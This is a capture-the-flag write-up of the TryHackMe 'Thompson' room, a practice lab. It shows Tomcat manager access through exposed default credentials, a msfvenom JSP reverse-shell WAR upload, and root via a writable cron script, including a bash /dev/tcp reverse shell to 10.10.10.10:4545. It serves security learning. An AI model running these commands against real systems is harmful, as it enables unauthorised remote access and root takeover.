---
title: "TryHackMe Thompson"
categories: [TryHackMe]
media_subpath: /images/tryhackme_thompson
image:
  path: room-image.png
---
## Enumeration
We starting with nmap scan:
  ```bash
  nmap -sS -sC -sV -T4 -Pn -p- <target>
  ```
Found 3 open ports:
  - 22 (SSH)
  - 80 (HTTP)
  - 8009 (AJP13)

![Nmap scan](1.png)

We have interesting directory (manager). Let's go check this website

![Gobuster enum](2.png)

---

## Tomcat manager login 

Tried to guess creds like tomcat:tomcat or admin:admin but no luck. Until "Cancel" button was clicked!

![Tomcat manager](3.png)  
![Credentials](4.png)

---

## Uploading reverse shell

We can upload `war` reverse shell using msfvenom:

**dont forget to change ip (tryhackme vpn ip) and port (if needed)**
  ```bash
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f war > reverse.war
  ```

New path appeared after uploading:

![Reverse shell uploaded](6.png)

Set up listener (on port you created reverse shell) and click on new directory to get a shell

We can upgrade shell using python (or python3)
  ```bash
  python -c "import pty; pty.spawn('/bin/bash')"
  ```
Then press CTRL+Z and type following
```bash
stty raw -echo; fg
```

Now press ENTER once

```bash
export TERM=xterm
```


![Shell](7.png)

---

## Found user and cronjob

Checking `/home` directory we found `jack` user

![User](8.png)

There's some script running every minute as root in jack's home directory, let's check what's there

![Cronjob](9.png)

Interesting... We could easily gain root access or just see contents of the root flag. 

![Image Alt Text](10.png)

---

## Privilege Escalation

### Method 1: Printing root flag content to test.txt

Edit `id.sh` like so and after a minute check test.txt:
  ```bash
  echo "cat /root/root.txt > test.txt" > id.sh
  ```

![Root flag](12.png)

### Method 2: Reverse shell as root

Edit `id.sh`:
  **change ip and port if to your machine**
  ```bash
  echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.10.10/4545 0>&1' > id.sh
  ```

Set up listener and wait for connection

![Root access](11.png)

